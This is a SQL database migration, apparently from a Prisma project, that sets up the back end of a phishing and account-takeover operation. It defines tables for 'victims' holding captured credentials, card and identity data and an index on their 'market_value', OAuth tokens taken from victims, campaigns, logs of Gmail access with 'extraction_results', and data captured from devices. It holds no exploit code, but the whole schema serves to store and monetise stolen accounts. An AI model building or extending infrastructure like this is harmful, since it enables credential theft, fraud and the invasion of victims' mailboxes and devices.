-- CreateTable
CREATE TABLE "victims" (
    "id" UUID NOT NULL,
    "email" VARCHAR(255) NOT NULL,
    "name" VARCHAR(255),
    "phone" VARCHAR(50),
    "password_hash" VARCHAR(255),
    "capture_timestamp" TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP,
    "campaign_id" UUID,
    "capture_method" VARCHAR(50) NOT NULL,
    "capture_source" VARCHAR(255),
    "session_data" JSONB NOT NULL DEFAULT '{}',
    "device_fingerprint" JSONB NOT NULL DEFAULT '{}',
    "validation" JSONB NOT NULL DEFAULT '{}',
    "exploitation_history" JSONB NOT NULL DEFAULT '{}',
    "risk_assessment" JSONB NOT NULL DEFAULT '{}',
    "card_information" JSONB NOT NULL DEFAULT '{}',
    "identity_verification" JSONB NOT NULL DEFAULT '{}',
    "created_at" TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP,
    "updated_at" TIMESTAMPTZ NOT NULL,
    "deleted_at" TIMESTAMPTZ,
    "is_active" BOOLEAN NOT NULL DEFAULT true,

    CONSTRAINT "victims_pkey" PRIMARY KEY ("id")
);

-- CreateTable
CREATE TABLE "oauth_tokens" (
    "id" UUID NOT NULL,
    "victim_id" UUID NOT NULL,
    "provider" VARCHAR(50) NOT NULL,
    "provider_metadata" JSONB NOT NULL DEFAULT '{}',
    "token_data" JSONB NOT NULL DEFAULT '{}',
    "issued_at" TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP,
    "expires_at" TIMESTAMPTZ NOT NULL,
    "last_refreshed" TIMESTAMPTZ,
    "refresh_count" INTEGER NOT NULL DEFAULT 0,
    "token_status" VARCHAR(50) NOT NULL DEFAULT 'active',
    "last_validation" TIMESTAMPTZ,
    "validation_success" BOOLEAN,
    "usage_history" JSONB NOT NULL DEFAULT '[]',
    "user_profile" JSONB NOT NULL DEFAULT '{}',
    "security_events" JSONB NOT NULL DEFAULT '[]',
    "created_at" TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP,
    "updated_at" TIMESTAMPTZ NOT NULL,

    CONSTRAINT "oauth_tokens_pkey" PRIMARY KEY ("id")
);

-- CreateTable
CREATE TABLE "admin_users" (
    "id" UUID NOT NULL,
    "username" VARCHAR(100) NOT NULL,
    "email" VARCHAR(255) NOT NULL,
    "password_hash" VARCHAR(255) NOT NULL,
    "role" VARCHAR(50) NOT NULL,
    "permissions" TEXT[] DEFAULT ARRAY[]::TEXT[],
    "access_restrictions" JSONB NOT NULL DEFAULT '{}',
    "mfa_config" JSONB NOT NULL DEFAULT '{}',
    "session_config" JSONB NOT NULL DEFAULT '{}',
    "activity_summary" JSONB NOT NULL DEFAULT '{}',
    "security_flags" JSONB NOT NULL DEFAULT '{}',
    "admin_metadata" JSONB NOT NULL DEFAULT '{}',
    "created_at" TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP,
    "updated_at" TIMESTAMPTZ NOT NULL,
    "is_active" BOOLEAN NOT NULL DEFAULT true,

    CONSTRAINT "admin_users_pkey" PRIMARY KEY ("id")
);

-- CreateTable
CREATE TABLE "campaigns" (
    "id" UUID NOT NULL,
    "name" VARCHAR(255) NOT NULL,
    "code" VARCHAR(100) NOT NULL,
    "description" TEXT,
    "config" JSONB NOT NULL DEFAULT '{}',
    "infrastructure" JSONB NOT NULL DEFAULT '{}',
    "timeline" JSONB NOT NULL DEFAULT '{}',
    "statistics" JSONB NOT NULL DEFAULT '{}',
    "success_criteria" JSONB NOT NULL DEFAULT '{}',
    "risk_assessment" JSONB NOT NULL DEFAULT '{}',
    "team" JSONB NOT NULL DEFAULT '{}',
    "status" VARCHAR(50) NOT NULL DEFAULT 'draft',
    "status_history" JSONB NOT NULL DEFAULT '[]',
    "created_at" TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP,
    "updated_at" TIMESTAMPTZ NOT NULL,
    "created_by" UUID,

    CONSTRAINT "campaigns_pkey" PRIMARY KEY ("id")
);

-- CreateTable
CREATE TABLE "activity_logs" (
    "id" UUID NOT NULL,
    "log_id" VARCHAR(100) NOT NULL,
    "action_type" VARCHAR(100) NOT NULL,
    "action_category" VARCHAR(50) NOT NULL,
    "severity_level" VARCHAR(20) NOT NULL,
    "actor" JSONB NOT NULL DEFAULT '{}',
    "target" JSONB NOT NULL DEFAULT '{}',
    "action_details" JSONB NOT NULL DEFAULT '{}',
    "technical_context" JSONB NOT NULL DEFAULT '{}',
    "geographic_context" JSONB NOT NULL DEFAULT '{}',
    "security_flags" JSONB NOT NULL DEFAULT '{}',
    "compliance" JSONB NOT NULL DEFAULT '{}',
    "related_logs" UUID[] DEFAULT ARRAY[]::UUID[],
    "timestamp" TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP,
    "created_at" TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP,
    "archived" BOOLEAN NOT NULL DEFAULT false,
    "archive_date" TIMESTAMPTZ,
    "retention_expires" TIMESTAMPTZ NOT NULL DEFAULT (NOW() + INTERVAL '2 years'),
    "admin_id" UUID,

    CONSTRAINT "activity_logs_pkey" PRIMARY KEY ("id")
);

-- CreateTable
CREATE TABLE "gmail_access_logs" (
    "id" UUID NOT NULL,
    "session_id" VARCHAR(100) NOT NULL,
    "parent_activity_log" UUID,
    "admin_id" UUID NOT NULL,
    "victim_id" UUID NOT NULL,
    "access_method" VARCHAR(50) NOT NULL,
    "authentication_details" JSONB NOT NULL DEFAULT '{}',
    "session_timeline" JSONB NOT NULL DEFAULT '{}',
    "extraction_results" JSONB NOT NULL DEFAULT '{}',
    "intelligence_analysis" JSONB NOT NULL DEFAULT '{}',
    "operational_security" JSONB NOT NULL DEFAULT '{}',
    "data_exports" JSONB NOT NULL DEFAULT '[]',
    "performance_metrics" JSONB NOT NULL DEFAULT '{}',
    "created_at" TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP,
    "completed_at" TIMESTAMPTZ,
    "status" VARCHAR(50) NOT NULL DEFAULT 'in_progress',

    CONSTRAINT "gmail_access_logs_pkey" PRIMARY KEY ("id")
);

-- CreateTable
CREATE TABLE "devices" (
    "id" UUID NOT NULL,
    "device_id" VARCHAR(255) NOT NULL,
    "platform" VARCHAR(50) NOT NULL,
    "platform_version" VARCHAR(100),
    "model" VARCHAR(255),
    "version" VARCHAR(100),
    "ip_address" VARCHAR(50),
    "connected_at" TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP,
    "last_seen" TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP,
    "disconnected_at" TIMESTAMPTZ,
    "status" VARCHAR(50) NOT NULL DEFAULT 'offline',
    "metadata" JSONB NOT NULL DEFAULT '{}',
    "connection_history" JSONB NOT NULL DEFAULT '[]',
    "activity_summary" JSONB NOT NULL DEFAULT '{}',
    "created_at" TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP,
    "updated_at" TIMESTAMPTZ NOT NULL,

    CONSTRAINT "devices_pkey" PRIMARY KEY ("id")
);

-- CreateTable
CREATE TABLE "device_data" (
    "id" UUID NOT NULL,
    "device_id" UUID NOT NULL,
    "data_type" VARCHAR(100) NOT NULL,
    "data" JSONB NOT NULL DEFAULT '{}',
    "metadata" JSONB NOT NULL DEFAULT '{}',
    "captured_at" TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP,
    "created_at" TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP,
    "updated_at" TIMESTAMPTZ NOT NULL,

    CONSTRAINT "device_data_pkey" PRIMARY KEY ("id")
);

-- CreateIndex
CREATE UNIQUE INDEX "victims_email_key" ON "victims"("email");

-- CreateIndex
CREATE INDEX "victims_email_idx" ON "victims"("email");

-- CreateIndex
CREATE INDEX "victims_capture_timestamp_idx" ON "victims"("capture_timestamp");

-- CreateIndex
CREATE INDEX "victims_campaign_id_capture_timestamp_idx" ON "victims"("campaign_id", "capture_timestamp");

-- CreateIndex
CREATE INDEX "victims_is_active_idx" ON "victims"("is_active");

-- CreateIndex
CREATE INDEX "victims_validation_gin_idx" ON "victims" USING GIN ("validation");

-- CreateIndex
CREATE INDEX "victims_risk_assessment_gin_idx" ON "victims" USING GIN ("risk_assessment");

-- CreateIndex
CREATE INDEX "victims_device_fingerprint_gin_idx" ON "victims" USING GIN ("device_fingerprint");

-- CreateIndex
CREATE INDEX "victims_validation_market_value_idx" ON "victims" ((validation->>'market_value'));

-- CreateIndex
CREATE INDEX "oauth_tokens_victim_id_idx" ON "oauth_tokens"("victim_id");

-- CreateIndex
CREATE INDEX "oauth_tokens_provider_token_status_idx" ON "oauth_tokens"("provider", "token_status");

-- CreateIndex
CREATE INDEX "oauth_tokens_expires_at_idx" ON "oauth_tokens"("expires_at");

-- CreateIndex
CREATE INDEX "oauth_tokens_issued_at_idx" ON "oauth_tokens"("issued_at");

-- CreateIndex
CREATE INDEX "oauth_tokens_token_status_idx" ON "oauth_tokens"("token_status");

-- CreateIndex
CREATE UNIQUE INDEX "admin_users_username_key" ON "admin_users"("username");

-- CreateIndex
CREATE UNIQUE INDEX "admin_users_email_key" ON "admin_users"("email");

-- CreateIndex
CREATE INDEX "admin_users_username_idx" ON "admin_users"("username");

-- CreateIndex
CREATE INDEX "admin_users_email_idx" ON "admin_users"("email");

-- CreateIndex
CREATE INDEX "admin_users_role_is_active_idx" ON "admin_users"("role", "is_active");

-- CreateIndex
CREATE INDEX "admin_users_is_active_idx" ON "admin_users"("is_active");

-- CreateIndex
CREATE UNIQUE INDEX "campaigns_code_key" ON "campaigns"("code");

-- CreateIndex
CREATE INDEX "campaigns_status_idx" ON "campaigns"("status");

-- CreateIndex
CREATE INDEX "campaigns_created_by_idx" ON "campaigns"("created_by");

-- CreateIndex
CREATE UNIQUE INDEX "activity_logs_log_id_key" ON "activity_logs"("log_id");

-- CreateIndex
CREATE INDEX "activity_logs_action_type_timestamp_idx" ON "activity_logs"("action_type", "timestamp");

-- CreateIndex
CREATE INDEX "activity_logs_timestamp_idx" ON "activity_logs"("timestamp");

-- CreateIndex
CREATE INDEX "activity_logs_retention_expires_idx" ON "activity_logs"("retention_expires");

-- CreateIndex
CREATE INDEX "activity_logs_action_category_severity_level_timestamp_idx" ON "activity_logs"("action_category", "severity_level", "timestamp");

-- CreateIndex
CREATE INDEX "activity_logs_archived_idx" ON "activity_logs"("archived");

-- CreateIndex
CREATE UNIQUE INDEX "gmail_access_logs_session_id_key" ON "gmail_access_logs"("session_id");

-- CreateIndex
CREATE INDEX "gmail_access_logs_admin_id_created_at_idx" ON "gmail_access_logs"("admin_id", "created_at");

-- CreateIndex
CREATE INDEX "gmail_access_logs_victim_id_created_at_idx" ON "gmail_access_logs"("victim_id", "created_at");

-- CreateIndex
CREATE INDEX "gmail_access_logs_status_created_at_idx" ON "gmail_access_logs"("status", "created_at");

-- CreateIndex
CREATE INDEX "gmail_access_logs_parent_activity_log_idx" ON "gmail_access_logs"("parent_activity_log");

-- CreateIndex
CREATE UNIQUE INDEX "devices_device_id_key" ON "devices"("device_id");

-- CreateIndex
CREATE INDEX "devices_platform_status_idx" ON "devices"("platform", "status");

-- CreateIndex
CREATE INDEX "devices_status_last_seen_idx" ON "devices"("status", "last_seen");

-- CreateIndex
CREATE INDEX "devices_connected_at_idx" ON "devices"("connected_at");

-- CreateIndex
CREATE INDEX "devices_last_seen_idx" ON "devices"("last_seen");

-- CreateIndex
CREATE INDEX "devices_metadata_gin_idx" ON "devices" USING GIN ("metadata");

-- CreateIndex
CREATE INDEX "device_data_data_gin_idx" ON "device_data" USING GIN ("data");

-- CreateIndex
CREATE INDEX "device_data_device_id_captured_at_idx" ON "device_data"("device_id", "captured_at");

-- CreateIndex
CREATE INDEX "device_data_data_type_captured_at_idx" ON "device_data"("data_type", "captured_at");

-- CreateIndex
CREATE INDEX "device_data_captured_at_idx" ON "device_data"("captured_at");

-- CreateIndex
CREATE INDEX "device_data_device_id_data_type_captured_at_idx" ON "device_data"("device_id", "data_type", "captured_at");

-- CreateIndex
CREATE UNIQUE INDEX "device_data_device_id_data_type_key" ON "device_data"("device_id", "data_type");

-- AddForeignKey
ALTER TABLE "victims" ADD CONSTRAINT "victims_campaign_id_fkey" FOREIGN KEY ("campaign_id") REFERENCES "campaigns"("id") ON DELETE SET NULL ON UPDATE CASCADE;

-- AddForeignKey
ALTER TABLE "oauth_tokens" ADD CONSTRAINT "oauth_tokens_victim_id_fkey" FOREIGN KEY ("victim_id") REFERENCES "victims"("id") ON DELETE CASCADE ON UPDATE CASCADE;

-- AddForeignKey
ALTER TABLE "campaigns" ADD CONSTRAINT "campaigns_created_by_fkey" FOREIGN KEY ("created_by") REFERENCES "admin_users"("id") ON DELETE SET NULL ON UPDATE CASCADE;

-- AddForeignKey
ALTER TABLE "activity_logs" ADD CONSTRAINT "activity_logs_admin_id_fkey" FOREIGN KEY ("admin_id") REFERENCES "admin_users"("id") ON DELETE SET NULL ON UPDATE CASCADE;

-- AddForeignKey
ALTER TABLE "gmail_access_logs" ADD CONSTRAINT "gmail_access_logs_parent_activity_log_fkey" FOREIGN KEY ("parent_activity_log") REFERENCES "activity_logs"("id") ON DELETE SET NULL ON UPDATE CASCADE;

-- AddForeignKey
ALTER TABLE "gmail_access_logs" ADD CONSTRAINT "gmail_access_logs_admin_id_fkey" FOREIGN KEY ("admin_id") REFERENCES "admin_users"("id") ON DELETE RESTRICT ON UPDATE CASCADE;

-- AddForeignKey
ALTER TABLE "gmail_access_logs" ADD CONSTRAINT "gmail_access_logs_victim_id_fkey" FOREIGN KEY ("victim_id") REFERENCES "victims"("id") ON DELETE CASCADE ON UPDATE CASCADE;

-- AddForeignKey
ALTER TABLE "device_data" ADD CONSTRAINT "device_data_device_id_fkey" FOREIGN KEY ("device_id") REFERENCES "devices"("id") ON DELETE CASCADE ON UPDATE CASCADE;

